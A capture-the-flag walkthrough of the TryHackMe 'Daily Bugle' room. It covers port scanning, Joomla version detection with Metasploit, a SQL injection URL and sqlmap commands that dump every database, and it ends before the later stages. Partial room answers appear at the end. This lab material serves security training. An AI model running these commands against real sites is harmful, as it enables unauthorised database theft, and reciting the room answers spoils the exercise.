
# Daily Bugle CTF Walkthrough

Daily Bugle is a vulnerable server on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/dailybugle<br />
THM Difficulty: Hard<br />
My Difficulty: TBA<br />
Target IP: 10.10.217.112<br />
AttackBox IP: 10.10.222.48<br />
</i>

# Recon

For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```shell
rustscan -a 10.10.217.112
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT1.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flags -sV -sC to find the service versions on the open port and to run Nmaps default scripts on the target.<br />
```
nmap -sV -p22,80,3306 10.10.217.112
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT2.png?raw=true)<br />
We have found multiple services running, let's have a closer look at these services.<br />

## HTTP Service Recon

We're going to start with looking at the HTTP Service, we can see it's running Apache 2.4.6 and PHP5.6.40 from the Nmap scan. I head over to the website below.
```shell
http://10.10.217.112/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT3.png?raw=true)<br />
Here we have our answer to the first question!<br />

Let's try having bruteforcing some directories with gobuster. I used the command below<br />
```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.217.112/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT4.png?raw=true)<br />
We are given plenty of results, the one that stood out to me was the /administrator directory, probably the login page for the administrators account? Let's have a look at it now<br />
```shell
http://10.10.217.112/administrator/
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT5.png?raw=true)<br />
Our suspicion is confirmed, we know know that the web service is using Joomla!<br />

### Finding Joomla version with Metasploit

I wonder what version of Joomla they're using..? I know there's a module on Metasploit that does this so let's fire it up!<br />
```shell
msfconsole
```
Now that we have our metasploit loaded, let's look for the joomla version module.<br />
```shell
search joomla_version
use 0
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT6.png?raw=true)<br />
Now we have selected our module let's see what options it requires by using show options
```shell
show options
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT7.png?raw=true)<br />
As you can see from the options available, the only option required is RHOSTS so let's set that and run the scanner!
```shell
SET RHOSTS 10.10.217.112
exploit
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT8.png?raw=true)<br />
Success! We have found the version! This is also one of the answers to our questions. Let's see if this version has any vulnerabilities.

### Exploiting Joomla with Metasploit

We are now going to look for exploits in Joomla 3.7, let's continue in the Metasploit console and execute the folowing<br />
```shell
back
search joomla 3.7.0
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT9.png?raw=true)<br />
We can see one exploit available, let's select the exploit and run "info" for more information to make sure it's compatible with our version of Joomla.<br />
```shell
use 0
info
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT10.png?raw=true)<br />
As we can see from the results this is the correct exploit for our Joomla version. Let's try to explot Joomla! First we'll need to set the required options for the module. Then hit exploit like we did for the scanner!<br />
```shell
set RHOSTS 10.10.217.112
exploit
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT11.png?raw=true)<br />
Uh-oh something went wrong, let's have a look at the "info" command again, let's check out the exploit-db link they provide.<br />
```shell
https://www.exploit-db.com/exploits/42033
```
Let's check if we get an error message when trying to load the URL that's vulnerable. 
```shell
http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT12.png?raw=true)<br />
We get the error message which confirms it's vulnerable to SQL injection. Let's try using SQLmap instead they have the syntax for the command on the exploit-db page.<br />

### Exploiting Joomla with SQLi using SQLMap

We're going to open up a new terminal and try the below command.<br />
```shell
sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT13.png?raw=true)<br />
Success! We were able to get the database names, now let's dump the whole database and check the findings! We will use a similar command except replace --dbs with --dump-all<br />
```shell
sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
```








## Questions & Answers

Question 1:<br />
**Access the web server, who robbed the bank?** Spiderman<br />

Question 2:<br />
**What is the Joomla version?** 3.7.0<br />

Question 3:<br />
**What is Jonah's cracked password?** <br />

Question 4:<br />
**What is the user flag?** <br />

Question 5:<br />
**What is the root flag?** <br />

### Farewell, I hope you all enjoyed this write-up!

